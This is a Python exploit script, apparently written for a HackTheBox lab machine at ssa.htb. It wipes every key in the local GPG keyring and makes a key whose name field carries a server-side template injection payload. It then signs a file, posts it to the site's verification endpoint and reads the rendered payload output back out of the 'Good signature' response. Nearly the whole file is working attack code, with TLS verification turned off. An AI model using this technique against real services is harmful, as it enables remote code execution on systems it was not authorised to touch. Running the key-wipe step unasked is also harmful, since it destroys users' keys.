import requests
import gnupg
import argparse
import re
import html

def keyid(name,gpg):
    input_data=gpg.gen_key_input(
        name_real=name,
        name_email="1@1.1",
        key_type="RSA",
        key_length=3072,
        passphrase="123456aA",
    )
    key=gpg.gen_key(input_data)
    return key

if __name__=='__main__':
    gpg=gnupg.GPG()
    gpg.encoding="utf-8"
    public_keys = gpg.list_keys()
    private_keys = gpg.list_keys(True)
    # 先删除所有公私钥
    for i in private_keys:
        gpg.delete_keys(i['fingerprint'],secret=True,passphrase="123456aA")
    for i in public_keys:
        gpg.delete_keys(i['fingerprint'])
    parser = argparse.ArgumentParser(description="gpg verify generate ssti code")
    parser.add_argument("name", type=str,help="ssti code(into {{}})")
    args = parser.parse_args()
    result=keyid(args.name,gpg)
    # print(result)
    #导出公钥
    ascii_armored_public_keys = gpg.export_keys(gpg.list_keys()[0]['keyid'])
    with open('./self_public','w') as public_key:
        public_key.write(ascii_armored_public_keys)
    #导出私钥
    ascii_armored_private_keys = gpg.export_keys(gpg.list_keys()[0]['keyid'],True,passphrase="123456aA")
    with open('./private_key.txt','w') as public_key:
        public_key.write(ascii_armored_private_keys)
    #生成签名内容
    with open('./input.txt','rb') as message:
        sign_data=gpg.sign_file(message,clearsign=True,passphrase="123456aA")
        with open('./input.txt.asc','w') as file:
            file.write(str(sign_data))
    url="https://ssa.htb/process"
    headers={
        'Host': 'ssa.htb',
        'Origin': 'https://ssa.htb',
        'Referer':'https://ssa.htb/guide/encrypt',
    }
    signed_text=open('./input.txt.asc','r').read()
    public_key=open('./self_public','r').read()
    data={
        'signed_text':signed_text,
        'public_key':public_key,
    }
    response=requests.post(url=url,headers=headers,data=data,verify=False)
    print(response.status_code)
    un_code_result=html.unescape(response.text)
    compare='gpg: Good signature from(.+)\s<.+>'
    print(re.findall(compare,un_code_result,re.S))
    # print(response.text)